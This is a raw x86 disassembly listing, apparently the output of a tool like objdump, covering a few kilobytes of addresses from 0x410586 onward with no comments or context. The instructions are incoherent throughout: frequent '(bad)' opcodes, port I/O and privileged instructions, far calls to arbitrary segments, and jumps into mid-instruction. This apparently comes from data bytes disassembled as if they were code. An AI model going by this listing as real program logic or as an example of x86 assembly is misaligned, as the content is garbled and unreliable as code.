  410586:	cmp    eax,0xa00590a7
  41058b:	fcomp  DWORD PTR [ecx-0x40]
  41058e:	dec    ecx
  41058f:	hlt    
  410590:	mov    dl,0x38
  410592:	cmp    ch,bl
  410594:	dec    ebp
  410595:	push   cs
  410596:	das    
  410597:	push   edx
  410598:	test   DWORD PTR [ecx+ebp*1],0xa5cdf027
  41059f:	aaa    
  4105a0:	cld    
  4105a1:	outs   dx,BYTE PTR ds:[esi]
  4105a2:	jge    0x4105c4
  4105a4:	mov    dl,0x9
  4105a6:	inc    ebx
  4105a7:	mov    ds:0xc393f267,eax
  4105ac:	pushf  
  4105ad:	jno    0x4105b1
  4105af:	mov    al,ds:0xb0b8a892
  4105b4:	out    dx,al
  4105b5:	scas   al,BYTE PTR es:[edi]
  4105b6:	add    BYTE PTR [edi],ah
  4105b8:	jbe    0x41055e
  4105ba:	xchg   esp,eax
  4105bb:	sub    DWORD PTR [esi-0x4d90a4c5],0x55
  4105c2:	ret    
  4105c3:	cmp    al,BYTE PTR [edx+0x58]
  4105c6:	push   es
  4105c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4105c8:	dec    ebp
  4105c9:	in     eax,0x9e
  4105cb:	mov    ds:0x775ac505,al
  4105d0:	in     eax,0x7
  4105d2:	fwait
  4105d3:	test   DWORD PTR [edx+0x5b43aa30],edx
  4105d9:	loope  0x410645
  4105db:	adc    dh,0xb
  4105de:	pop    edx
  4105df:	add    al,0x76
  4105e1:	aaa    
  4105e2:	sbb    DWORD PTR [ebp-0x22],esp
  4105e5:	push   esp
  4105e6:	call   0xf456:0xe26cbec5
  4105ed:	pop    edx
  4105ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4105f0:	(bad)  
  4105f1:	adc    al,BYTE PTR [ecx+edx*8]
  4105f4:	sti    
  4105f5:	mov    dl,0x93
  4105f7:	jecxz  0x4105ab
  4105f9:	jo     0x410664
  4105fb:	add    al,dh
  4105fd:	nop
  4105fe:	sub    ebp,edi
  410600:	xor    cl,BYTE PTR [ebx]
  410602:	jo     0x410661
  410604:	clc    
  410605:	gs aaa 
  410607:	lahf   
  410608:	int3   
  410609:	push   ds
  41060a:	jp     0x4105b6
  41060c:	lods   al,BYTE PTR ds:[esi]
  41060d:	out    dx,eax
  41060e:	inc    edx
  41060f:	loop   0x4105c2
  410611:	cs mov cl,0x9b
  410614:	ja     0x4105f8
  410616:	jp     0x4105b4
  410618:	xchg   edx,eax
  410619:	mov    esp,0x9bc7a5c0
  41061e:	push   ebp
  41061f:	push   ebp
  410620:	ins    BYTE PTR es:[edi],dx
  410621:	and    bl,BYTE PTR [edx+0x8]
  410624:	fnsave [ebp+0x68]
  410627:	mov    WORD PTR [edx+0x617686b3],?
  41062d:	in     al,dx
  41062e:	push   edi
  41062f:	adc    ah,BYTE PTR [ecx]
  410631:	jns    0x410654
  410633:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410634:	jns    0x410677
  410636:	les    ebx,FWORD PTR ds:0xcea16cb7
  41063c:	mov    cl,0xd3
  41063e:	fcmovne st,st(4)
  410640:	mov    bh,BYTE PTR [edx-0x7cf28060]
  410646:	fisub  WORD PTR [edi+0x6c84e8e5]
  41064c:	xor    ch,BYTE PTR [ebx-0x334ee4ca]
  410652:	jmp    0x4106a9
  410654:	mov    ds:0xc82fb19d,al
  410659:	xor    ebp,DWORD PTR [edx-0x5a]
  41065c:	push   es
  41065d:	cwde   
  41065e:	(bad)  [esi+edi*8]
  410661:	and    DWORD PTR [edx-0x35197986],edi
  410667:	(bad)  
  410668:	aam    0xc2
  41066a:	fwait
  41066b:	xlat   BYTE PTR ds:[ebx]
  41066c:	mov    ah,0x26
  41066e:	gs daa 
  410670:	dec    edx
  410671:	ror    DWORD PTR [ebx+0x55],0x62
  410675:	inc    eax
  410676:	jnp    0x4106cd
  410678:	cmp    BYTE PTR [edi-0x65],al
  41067b:	jne    0x41062f
  41067d:	add    BYTE PTR ds:0x73db7eb0,ah
  410683:	int    0xb2
  410685:	pop    edx
  410686:	dec    edi
  410687:	shl    BYTE PTR [esi+0x44],1
  41068a:	push   ss
  41068b:	test   bl,dl
  41068d:	or     edi,DWORD PTR [eax-0x4d]
  410690:	dec    ecx
  410691:	sbb    ebp,eax
  410693:	or     DWORD PTR [eax-0x59],edi
  410696:	xchg   ecx,eax
  410697:	xchg   edi,eax
  410698:	cmp    dl,bh
  41069a:	pop    eax
  41069b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41069c:	adc    ebp,eax
  41069e:	pusha  
  41069f:	inc    ecx
  4106a0:	ret    0x100b
  4106a3:	out    dx,al
  4106a4:	out    0xa3,al
  4106a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106a7:	mov    ebx,eax
  4106a9:	pop    ds
  4106aa:	call   0xc4b8:0x23e9c78d
  4106b1:	lahf   
  4106b2:	mov    esi,0x24c731a7
  4106b7:	sbb    BYTE PTR ds:0xb2c352c0,dh
  4106bd:	xor    eax,0x73d2ff1b
  4106c2:	test   DWORD PTR [eax-0x54],ebx
  4106c5:	sti    
  4106c6:	or     ah,BYTE PTR [edi-0xb2e7ebc]
  4106cc:	lea    eax,[ebp-0x3c613041]
  4106d2:	(bad)  
  4106d3:	out    dx,eax
  4106d4:	mov    ch,0x2b
  4106d6:	sub    al,0x4a
  4106d8:	loope  0x410752
  4106da:	pop    ds
  4106db:	pop    ds
  4106dc:	sub    eax,0x44a764c0
  4106e1:	ins    BYTE PTR es:[edi],dx
  4106e2:	outs   dx,DWORD PTR ds:[esi]
  4106e3:	or     dh,dh
  4106e5:	push   eax
  4106e6:	pop    ss
  4106e7:	in     eax,0xb2
  4106e9:	jae    0x41067b
  4106eb:	xchg   ebp,eax
  4106ec:	jmp    0x41074d
  4106ee:	mov    WORD PTR [edi],es
  4106f0:	xor    ah,BYTE PTR [ebx]
  4106f2:	ins    DWORD PTR es:[edi],dx
  4106f3:	inc    ecx
  4106f4:	inc    esp
  4106f5:	or     edi,DWORD PTR [ebp-0x283952ea]
  4106fb:	ficomp WORD PTR [ebp+0x1bc69aaa]
  410701:	repz sub eax,0x982e1915
  410707:	add    eax,0xffa7ed4f
  41070d:	fcomp  QWORD PTR [edx+0x30]
  410710:	data16 and bl,BYTE PTR [edx+0x64762699]
  410717:	add    BYTE PTR [esi+0x9a79e04],bh
  41071d:	loop   0x4106da
  41071f:	fcom   st(3)
  410721:	sub    esi,DWORD PTR [ecx]
  410723:	add    esi,DWORD PTR [ebp+0x683ebfdc]
  410729:	sahf   
  41072a:	jp     0x410717
  41072c:	xor    al,0x1c
  41072e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41072f:	test   al,0x0
  410731:	shl    BYTE PTR [ecx],cl
  410733:	mov    ss,edx
  410735:	cld    
  410736:	ror    BYTE PTR [ecx],cl
  410738:	adc    eax,DWORD PTR ds:0x2a72c69a
  41073e:	sahf   
  41073f:	fidivr WORD PTR [esi-0x4e58db93]
  410745:	and    DWORD PTR [ebx-0x2f16f966],edx
  41074b:	bound  ecx,QWORD PTR [edi+edx*2-0x2205824]
  410752:	retf   0x1f8e
  410755:	sub    al,0xd7
  410757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410758:	pop    ecx
  410759:	sbb    eax,0x1312c20a
  41075e:	push   esi
  41075f:	dec    ecx
  410760:	mov    dl,0xcd
  410762:	and    edx,edx
  410764:	aad    0x24
  410766:	jbe    0x4107d5
  410768:	cli    
  410769:	or     BYTE PTR [edi],bh
  41076b:	scas   al,BYTE PTR es:[edi]
  41076c:	mov    ch,0x7d
  41076e:	out    0xb1,al
  410770:	push   edx
  410771:	add    al,0x17
  410773:	outs   dx,BYTE PTR ds:[esi]
  410774:	push   eax
  410775:	add    DWORD PTR [edx-0x67622644],ebx
  41077b:	(bad)  
  41077c:	cli    
  41077d:	shr    BYTE PTR [ecx+0x561789a7],cl
  410783:	lock xchg esp,eax
  410785:	es push ds
  410787:	repz mov dl,0xd7
  41078a:	adc    al,0x6
  41078c:	jno    0x41074e
  41078e:	jle    0x4107f7
  410790:	int3   
  410791:	or     esi,ebp
  410793:	or     ch,ah
  410795:	mov    eax,0xb2bfd40d
  41079a:	call   0x9920:0xb5b1cb35
  4107a1:	inc    ebx
  4107a2:	push   es
  4107a3:	mov    ebx,0x67684ac2
  4107a8:	cmp    al,0xa3
  4107aa:	stos   DWORD PTR es:[edi],eax
  4107ab:	push   edx
  4107ac:	pop    edi
  4107ad:	lahf   
  4107ae:	mov    al,ds:0x298b69d3
  4107b3:	dec    eax
  4107b4:	call   0x1a0c:0x7ae7c1fb
  4107bb:	cmp    DWORD PTR [esp+ebp*8+0x2c],esp
  4107bf:	xchg   edi,eax
  4107c0:	test   eax,0xad980d3d
  4107c5:	leave  
  4107c6:	test   DWORD PTR [eax-0xe4950d1],eax
  4107cc:	mov    ch,0x7b
  4107ce:	xchg   edi,eax
  4107d0:	adc    ch,BYTE PTR [eax]
  4107d2:	mov    dl,0xab
  4107d4:	iret   
  4107d5:	or     esp,DWORD PTR [edi]
  4107d7:	jmp    0x41082e
  4107d9:	imul   ebp,DWORD PTR [eax-0x6252adb4],0xccc6cb4d
  4107e3:	or     eax,0x80989e12
  4107e8:	es or  al,0xd7
  4107eb:	or     bh,BYTE PTR [edi]
  4107ed:	test   al,0xf0
  4107ef:	and    edi,DWORD PTR [esp+ecx*4]
  4107f2:	mov    cl,0x27
  4107f4:	test   eax,0xb2c4d107
  4107f9:	jge    0x4107a4
  4107fb:	add    eax,0xa44e0fd7
  410800:	mov    ebp,0xb3934937
  410805:	xor    ecx,DWORD PTR [esi+edx*8+0x4e5abe56]
  41080c:	dec    esp
  41080d:	sub    ecx,ecx
  41080f:	jmp    0xf41989c9
  410814:	lds    eax,FWORD PTR [edx+0xcf3e5a]
  41081a:	mov    bh,0x9d
  41081c:	adc    BYTE PTR [ebp-0x3dcd366],ch
  410822:	adc    ah,BYTE PTR [ecx-0x32653d9f]
  410828:	fiadd  DWORD PTR ds:0x3308df0e
  41082e:	fwait
  41082f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410830:	mov    ebx,0xba247d42
  410835:	je     0x4107f2
  410837:	pushf  
  410838:	mov    ch,0x6e
  41083a:	ins    BYTE PTR es:[edi],dx
  41083b:	iret   
  41083c:	adc    dl,BYTE PTR [edx+ebx*1]
  41083f:	xchg   ebx,eax
  410840:	rcr    DWORD PTR [esi-0x70b158ec],1
  410846:	xor    esi,DWORD PTR [esi-0x34581af0]
  41084c:	mov    esp,0x24dbee2
  410851:	imul   edi,DWORD PTR [ecx+0x783b2614],0xffffffa7
  410858:	(bad)  
  410859:	add    eax,0xaa8a9913
  41085e:	push   edi
  41085f:	jl     0x410813
  410861:	and    eax,DWORD PTR [edi+0x9]
  410864:	rol    DWORD PTR [ecx],1
  410866:	clc    
  410867:	icebp  
  410868:	dec    esi
  410869:	or     eax,eax
  41086b:	int3   
  41086c:	or     dl,BYTE PTR [ebx+0x37d2ab0c]
  410872:	call   0xdce6:0x6f6f4be
  410879:	in     eax,dx
  41087a:	or     esp,DWORD PTR [esi-0x61098937]
  410880:	jns    0x410864
  410882:	sbb    DWORD PTR [esi-0x169c48d],eax
  410888:	pop    eax
  410889:	in     eax,0xa6
  41088b:	xchg   ah,bh
  41088d:	or     eax,DWORD PTR [edi-0x39]
  410890:	pop    ds
  410891:	pop    ecx
  410892:	inc    ebp
  410893:	pop    ss
  410894:	ret    0x550b
  410897:	push   esp
  410898:	(bad)  
  410899:	push   ss
  41089a:	sub    cl,dl
  41089c:	inc    edi
  41089d:	sub    eax,0xdc71e39a
  4108a2:	fs inc ebx
  4108a4:	xchg   ebx,eax
  4108a5:	mov    dl,0x1b
  4108a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108a8:	push   ebx
  4108a9:	lock sahf 
  4108ab:	xlat   BYTE PTR ds:[ebx]
  4108ac:	(bad)  
  4108ad:	push   ebx
  4108ae:	mov    ss,esi
  4108b0:	mov    dl,0x44
  4108b2:	inc    DWORD PTR [ebx-0x20f45e86]
  4108b8:	mov    ah,0xb
  4108ba:	push   0x5ce441c9
  4108bf:	fdiv   st,st(7)
  4108c1:	sbb    BYTE PTR [edx+0x316b45cf],bl
  4108c7:	mov    ch,0x44
  4108c9:	adc    bh,BYTE PTR [ebx-0x59]
  4108cc:	lock or eax,0x3fdba995
  4108d2:	jo     0x4108fa
  4108d4:	push   esi
  4108d5:	imul   esp,DWORD PTR [edx-0x24],0x58def2b2
  4108dc:	mov    esi,0xeffcea3a
  4108e1:	adc    eax,0x4454bdef
  4108e6:	rcr    ecx,1
  4108e8:	jb     0x410945
  4108ea:	pop    esi
  4108eb:	retf   0x3b0e
  4108ee:	retf   0x50f8
  4108f1:	inc    ebp
  4108f2:	call   0x94a5:0x16a6378b
  4108f9:	ret    
  4108fa:	xor    al,0x9e
  4108fc:	sub    BYTE PTR [esi+eax*1],al
  4108ff:	gs (bad) 
  410901:	or     eax,DWORD PTR [ebx]
  410903:	xchg   edi,eax
  410904:	sbb    DWORD PTR [ebp-0x8],0x8220b211
  41090b:	sub    eax,0xff7eeb0
  410910:	ror    BYTE PTR [ebx],cl
  410912:	lods   al,BYTE PTR ds:[esi]
  410913:	fdiv   QWORD PTR [esi]
  410915:	call   0x6099:0x4bf6f564
  41091c:	gs in  al,0x91
  41091f:	sub    DWORD PTR [ebx-0x45],ebx
  410922:	jle    0x41092a
  410924:	jecxz  0x410931
  410926:	fdivr  st(1),st
  410928:	lods   al,BYTE PTR ds:[esi]
  410929:	jl     0x410922
  41092b:	mov    bh,0xa0
  41092d:	or     DWORD PTR [esi-0x254978bc],eax
  410933:	push   ds
  410934:	mov    dh,0xd0
  410936:	ret    0x430d
  410939:	imul   DWORD PTR [edi+eiz*4-0x7de4fa9d]
  410940:	or     al,0x8e
  410942:	inc    ebx
  410943:	mov    bh,BYTE PTR [esi+edx*1-0x54250dde]
  41094a:	pop    ss
  41094b:	jns    0x4109b5
  41094d:	rol    BYTE PTR [ebx-0x73b2b152],1
  410953:	jmp    0x4109bf
  410955:	cmp    ch,cl
  410957:	push   ecx
  410958:	mov    dl,0x20
  41095a:	cmp    eax,0x5f1342ef
  41095f:	jo     0x410924
  410961:	push   ss
  410962:	xor    cl,BYTE PTR [ecx]
  410964:	clc    
  410965:	lds    ecx,FWORD PTR [edx-0x56]
  410968:	repnz bnd jmpw 0x958f
  41096e:	cdq    
  41096f:	push   edx
  410970:	addr16 out dx,eax
  410972:	mov    bh,0x88
  410974:	ins    DWORD PTR es:[edi],dx
  410975:	mov    WORD PTR [ebx],ds
  410977:	push   esi
  410978:	push   0x17266a70
  41097d:	je     0x410903
  41097f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410980:	sub    esp,esp
  410982:	jns    0x41099c
  410984:	loope  0x4109bc
  410986:	add    BYTE PTR [ecx],ah
  410988:	mov    dl,0x8f
  41098a:	push   eax
  41098b:	inc    eax
  41098c:	lahf   
  41098d:	jno    0x4109d7
  41098f:	jo     0x410940
  410991:	xor    al,0x2e
  410993:	in     al,0x3c
  410995:	call   0x2d7b:0x2e123114
  41099c:	sbb    eax,0xb21260d4
  4109a1:	add    ebp,ebx
  4109a3:	or     eax,0x84cb0515
  4109a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109a9:	adc    al,0xa8
  4109ab:	out    0x39,al
  4109ad:	mov    ecx,DWORD PTR [ebx+ebx*8]
  4109b0:	je     0x4109d4
  4109b2:	mov    ah,0x26
  4109b4:	mov    bl,0x4
  4109b6:	bound  edx,QWORD PTR [esi+edi*4+0x7672865b]
  4109bd:	inc    ecx
  4109be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4109bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109c0:	outs   dx,BYTE PTR ds:[esi]
  4109c1:	mov    es,WORD PTR [eax-0x44]
  4109c4:	int    0x86
  4109c6:	push   0xffffffae
  4109c8:	mov    ch,0xae
  4109ca:	jbe    0x4109ed
  4109cc:	rcr    edx,0xfb
  4109cf:	rol    bl,cl
  4109d1:	jmp    0xe99e3190
  4109d6:	aaa    
  4109d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109d8:	xlat   BYTE PTR ds:[ebx]
  4109d9:	add    eax,0x1c1123dd
  4109de:	mov    WORD PTR [eax-0x43],?
  4109e1:	mov    eax,0x6ba90873
  4109e6:	xor    esp,DWORD PTR [ecx+ebp*1-0x63]
  4109ea:	sbb    ah,BYTE PTR [edi-0x2891fc1a]
  4109f0:	dec    ecx
  4109f1:	mov    bl,0x23
  4109f3:	push   ecx
  4109f4:	mov    dl,0xa9
  4109f6:	or     dh,cl
  4109f8:	cmp    DWORD PTR [ebp+0xa168420],0xf2f3c67a
  410a02:	xor    BYTE PTR [eax+edi*1-0xd],al
  410a06:	adc    edi,eax
  410a08:	mov    dh,0x91
  410a0a:	mov    ebp,0x5a00df20
  410a0f:	xor    ebp,DWORD PTR [edx-0x1158dc45]
  410a15:	ins    DWORD PTR es:[edi],dx
  410a16:	in     eax,0x74
  410a18:	das    
  410a19:	leave  
  410a1a:	scas   eax,DWORD PTR es:[edi]
  410a1b:	lea    esi,[edx-0x6f411b7c]
  410a21:	dec    esi
  410a22:	push   ebp
  410a23:	xchg   ebx,eax
  410a24:	in     eax,dx
  410a25:	ss ins BYTE PTR es:[edi],dx
  410a27:	cmp    DWORD PTR [esi+0xb],ecx
  410a2a:	in     al,dx
  410a2b:	jl     0x4109e0
  410a2d:	das    
  410a2e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a2f:	xchg   edi,ebx
  410a31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a32:	call   0xdee6:0x4dc77f60
  410a39:	sbb    ah,BYTE PTR [ecx+eax*2]
  410a3c:	jmp    0x410a49
  410a3e:	sub    cl,BYTE PTR [eax]
  410a40:	sbb    edx,DWORD PTR [eax]
  410a42:	andps  xmm6,XMMWORD PTR [edi]
  410a45:	aas    
  410a46:	call   0x476c:0x1117a20d
  410a4d:	test   DWORD PTR [eax-0x59],esp
  410a50:	sub    BYTE PTR [edx],ah
  410a52:	out    dx,eax
  410a53:	fstp   DWORD PTR [esi-0x4d068ced]
  410a59:	fidivr DWORD PTR [edx-0x56]
  410a5c:	aad    0x5
  410a5e:	adc    eax,0x38f1892e
  410a63:	lods   al,BYTE PTR ds:[esi]
  410a64:	mov    al,0xd0
  410a66:	jg     0x4109fd
  410a68:	xor    ah,BYTE PTR [edi-0xd]
  410a6b:	xchg   edx,eax
  410a6c:	shl    DWORD PTR [edi-0x18],1
  410a6f:	or     edi,esi
  410a71:	adc    DWORD PTR [ebp-0x47],0xffffffa1
  410a75:	push   eax
  410a76:	call   0x5ca3:0x7727847
  410a7d:	or     ecx,DWORD PTR [eax+0xe8f4a7d]
  410a83:	xor    BYTE PTR [esi],ch
  410a85:	push   ds
  410a86:	call   0xcb22:0x1c605803
  410a8d:	cmp    ebx,DWORD PTR [eax]
  410a8f:	aam    0x61
  410a91:	or     edi,ebx
  410a93:	jns    0x410a93
  410a95:	mov    eax,ss
  410a97:	lahf   
  410a98:	and    dh,BYTE PTR [edx]
  410a9a:	call   0xff04:0xe61fb3e4
  410aa1:	call   0xfff9:0xd2fca93b
  410aa8:	xor    ch,BYTE PTR [esi]
  410aaa:	ja     0x410aed
  410aac:	jp     0x410a7e
  410aae:	call   0x85ca:0xca28ca26
  410ab5:	dec    esi
  410ab6:	adc    ebp,DWORD PTR [ecx-0x6ae04581]
  410abc:	mov    dl,0xfa
  410abe:	mov    esi,0x9a865691
  410ac3:	jmp    0x975c11d6
  410ac8:	(bad)  
  410ac9:	rcl    DWORD PTR [edi-0x652cae65],0x4f
  410ad0:	inc    ebp
  410ad1:	ret    
  410ad2:	int    0xc
  410ad4:	add    ch,BYTE PTR [edx+edi*2-0x13]
  410ad8:	mov    ch,0x93
  410ada:	push   edi
  410adb:	sbb    DWORD PTR [edi+0x3459daab],ebx
  410ae1:	mov    ebp,fs
  410ae3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410ae4:	pandn  mm6,QWORD PTR [eax-0x7a0712b9]
  410aeb:	stc    
  410aec:	push   esp
  410aed:	repnz call 0xc62b:0x4c6aaf86
  410af5:	xor    eax,0x6508b891
  410afa:	lea    esp,[edi+0x4de875e4]
  410b00:	mov    edi,0xc3119a76
  410b05:	sbb    eax,0x3a466355
  410b0a:	and    edi,DWORD PTR [ecx+0x5a8bf037]
  410b10:	les    eax,FWORD PTR [edx]
  410b12:	loopne 0x410ae3
  410b14:	jle    0x410aaf
  410b16:	sbb    al,BYTE PTR [eax+edi*4]
  410b19:	mov    esi,0xd3af38dc
  410b1e:	sar    DWORD PTR [ebp-0x57ee058e],0x8d
  410b25:	and    al,0x79
  410b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b28:	(bad)  
  410b29:	in     eax,dx
  410b2a:	pop    edi
  410b2b:	lds    ecx,FWORD PTR [ecx+edx*2]
  410b2e:	(bad)  
  410b30:	mov    esp,0xcef2f059
  410b35:	stos   DWORD PTR es:[edi],eax
  410b36:	bound  eax,QWORD PTR [edi-0x59]
  410b39:	stos   DWORD PTR es:[edi],eax
  410b3a:	push   esp
  410b3b:	add    DWORD PTR [edx+0x31],0xffffff8d
  410b3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410b40:	test   DWORD PTR [esi+0x3],edi
  410b43:	or     bh,BYTE PTR [eax+0x55b4a4cf]
  410b49:	or     esp,eax
  410b4b:	shl    dl,1
  410b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b4e:	mov    bl,0x82
  410b50:	in     eax,0xb
  410b52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b53:	(bad)  [ecx+0x26]
  410b56:	push   cs
  410b57:	loop   0x410b7d
  410b59:	push   0xffffff9a
  410b5b:	xchg   BYTE PTR [ebx+0x8bee086],ah
  410b61:	stc    
  410b62:	retf   0x30a7
  410b65:	mov    ebp,0xa5b0d1d6
  410b6a:	add    eax,0x58feb201
  410b6f:	adc    BYTE PTR [ecx+0x7b],al
  410b72:	fsubr  st(2),st
  410b74:	adc    cl,BYTE PTR [ebx]
  410b76:	and    ebx,DWORD PTR [esp+esi*2+0x644a4e49]
  410b7d:	dec    ebx
  410b7e:	popf   
  410b7f:	sub    bl,ch
  410b81:	mov    ebp,0xbad2ea16
  410b86:	mov    cl,0x83
  410b88:	cmc    
  410b89:	or     edx,DWORD PTR [eax-0x7da8c5c3]
  410b8f:	and    al,0x5c
  410b91:	cdq    
  410b92:	call   0xbe57:0xd8bd6f62
  410b99:	xor    al,0xbe
  410b9b:	mov    edx,0xd881630e
  410ba0:	nop    DWORD PTR [ebx]
  410ba3:	sub    eax,0x7d9a4c95
  410ba8:	fcmovnu st,st(5)
  410baa:	sub    edi,DWORD PTR [ebx]
  410bac:	mov    dl,0x65
  410bae:	bound  ebx,QWORD PTR [ecx+0x2874abeb]
  410bb4:	sti    
  410bb5:	jbe    0x410bc9
  410bb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410bb8:	dec    esp
  410bb9:	cld    
  410bba:	jb     0x410bfe
  410bbc:	cwde   
  410bbd:	(bad)  
  410bbf:	xlat   BYTE PTR ds:[ebx]
  410bc0:	push   ss
  410bc1:	pop    ds
  410bc2:	fwait
  410bc3:	push   edi
  410bc4:	inc    ecx
  410bc5:	dec    ecx
  410bc6:	cmp    dl,BYTE PTR [edi]
  410bc8:	jmp    0xc30b:0xd47aaa9e
  410bcf:	lds    ecx,FWORD PTR [eax+0x3]
  410bd2:	push   eax
  410bd3:	and    ah,BYTE PTR [edx-0x500f6570]
  410bd9:	loop   0x410b5b
  410bdb:	cmp    DWORD PTR [ecx-0x264b595b],esi
  410be1:	xor    eax,0xc9da7f8
  410be6:	out    dx,al
  410be7:	or     al,0x92
  410be9:	addr16 call 0x2a40:0xac489ae1
  410bf1:	pop    ss
  410bf2:	cmp    BYTE PTR [esi+0x5ea770ed],ah
  410bf8:	imul   ecx,esi,0x1f074ba6
  410bfe:	call   0xd032:0xcf7f426b
  410c05:	loopne 0x410c63
  410c07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c08:	dec    edx
  410c09:	ret    0x7e42
  410c0c:	jg     0x410bf8
  410c0e:	rcr    BYTE PTR [ecx+esi*4],cl
  410c11:	scas   eax,DWORD PTR es:[edi]
  410c12:	imul   edx,DWORD PTR [esi+0x5fcbc03e],0xa7f5e221
  410c1c:	xchg   ecx,eax
  410c1d:	sub    eax,0x722886a8
  410c22:	push   ebx
  410c23:	mov    eax,ds:0xf770ca58
  410c28:	mov    dl,0xa8
  410c2a:	out    dx,eax
  410c2b:	xor    edx,edx
  410c2d:	int3   
  410c2e:	mov    esi,0x330afe74
  410c33:	mov    ds:0xa8d26e65,al
  410c38:	jmp    0x6167:0xb258e5cf
  410c3f:	mul    ebp
  410c41:	popf   
  410c42:	adc    DWORD PTR [eax-0x31],0x21e0ee0b
  410c49:	(bad)  
  410c4a:	cmp    eax,0x9a6a07c8
  410c4f:	je     0x410c99
  410c51:	outs   dx,BYTE PTR ds:[esi]
  410c52:	jmp    0x44dd3e90
  410c57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c58:	push   ss
  410c59:	arpl   WORD PTR cs:[ecx-0x4ca52300],sp
  410c60:	or     bh,BYTE PTR [ecx-0x66]
  410c63:	ja     0x410c52
  410c65:	in     al,dx
  410c66:	pop    ebp
  410c67:	pop    es
  410c68:	sub    al,0xf5
  410c6a:	in     eax,dx
  410c6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410c6c:	xor    bl,BYTE PTR [edx-0x7]
  410c6f:	sub    edi,DWORD PTR ds:0x59a01ac6
  410c75:	arpl   WORD PTR [ebp-0x278a106e],dx
  410c7b:	daa    
  410c7c:	pop    esp
  410c7d:	mov    edx,0xb96048c
  410c82:	loope  0x410ca1
  410c84:	xchg   ebp,eax
  410c85:	enter  0xdacb,0xd2
  410c89:	xchg   ebp,eax
  410c8a:	call   0x8908:0xc42d8a18
  410c91:	adc    bl,0xa8
  410c94:	mov    WORD PTR [esi+edi*1+0x31657205],?
  410c9b:	inc    esi
  410c9c:	frstor [edx+0x50c74e9a]
  410ca2:	into   
  410ca3:	xor    BYTE PTR [ebx-0x6b],ch
  410ca6:	pop    edi
  410ca7:	mov    cl,0x8f
  410ca9:	mov    DWORD PTR [edx+0x2f0fe6a4],esi
  410caf:	int3   
  410cb0:	push   0x10
  410cb2:	sbb    al,BYTE PTR [edx-0x4e]
  410cb5:	sub    edx,ebp
  410cb7:	dec    ebp
  410cb8:	in     al,0x31
  410cba:	xchg   DWORD PTR [edi+edi*2],esp
  410cbd:	sbb    al,0xa3
  410cbf:	(bad)  
  410cc0:	cmp    BYTE PTR [ebx],cl
  410cc2:	pop    edx
  410cc3:	add    cl,BYTE PTR [eax]
  410cc5:	xchg   edi,eax
  410cc6:	jecxz  0x410c4c
  410cc8:	inc    eax
  410cc9:	mov    ebp,0x77b2a1e1
  410cce:	nop
  410ccf:	ja     0x410d1a
  410cd1:	pop    es
  410cd2:	in     eax,0x36
  410cd4:	(bad)  
  410cd6:	fs (bad) 
  410cd8:	cdq    
  410cd9:	(bad)  
  410cdb:	fsubr  QWORD PTR [esi-0x25]
  410cde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410cdf:	popf   
  410ce0:	mov    ecx,0x870d6b0
  410ce5:	mov    esi,ebx
  410ce7:	mov    ?,WORD PTR [ecx-0x19]
  410cea:	ins    DWORD PTR es:[edi],dx
  410ceb:	sti    
  410cec:	or     cl,BYTE PTR [ebx]
  410cee:	in     al,dx
  410cef:	(bad)  
  410cf0:	cli    
  410cf1:	or     ebx,DWORD PTR [eax-0xe]
  410cf4:	mov    WORD PTR [edx+eiz*8-0x57],ss
  410cf8:	sub    edi,DWORD PTR [ebp+0x2cb1d0e7]
  410cfe:	cld    
  410cff:	inc    ecx
  410d00:	pop    esi
  410d01:	xchg   esp,eax
  410d02:	mov    ch,0x2f
  410d04:	mov    ecx,ebx
  410d06:	jne    0x410cc0
  410d08:	pop    eax
  410d09:	dec    ebp
  410d0a:	xor    ah,BYTE PTR [edi+0x576f4bf1]
  410d10:	cmc    
  410d11:	pop    esi
  410d12:	jp     0x410d5a
  410d14:	mov    dl,0x7c
  410d16:	mov    dh,0x99
  410d18:	call   0x9808:0x5ec9fdf7
  410d1f:	retf   
  410d20:	mov    dh,0x73
  410d22:	call   0x88c27019
  410d27:	jns    0x410cde
  410d29:	sti    
  410d2a:	push   0x7a17aaf1
  410d2f:	imul   edx,DWORD PTR ds:[eax-0x603e5851],0xec4db939
  410d3a:	jp     0x410cd2
  410d3c:	lea    esp,[ebx-0x14ac061f]
  410d42:	dec    ebp
  410d43:	jg     0x410d27
  410d45:	jle    0x410da4
  410d47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d48:	outs   dx,BYTE PTR ds:[esi]
  410d49:	push   ecx
  410d4a:	push   ds
  410d4b:	xor    esi,0x50
  410d4e:	xchg   edx,eax
  410d4f:	out    0xb2,al
  410d51:	inc    edi
  410d52:	dec    edx
  410d53:	sub    bh,ah
  410d55:	les    esp,FWORD PTR [eax+eax*1-0x58931a55]
  410d5c:	jae    0x410d34
  410d5e:	jg     0x410d78
  410d60:	rcr    DWORD PTR [eax-0x254ded6e],0xc8
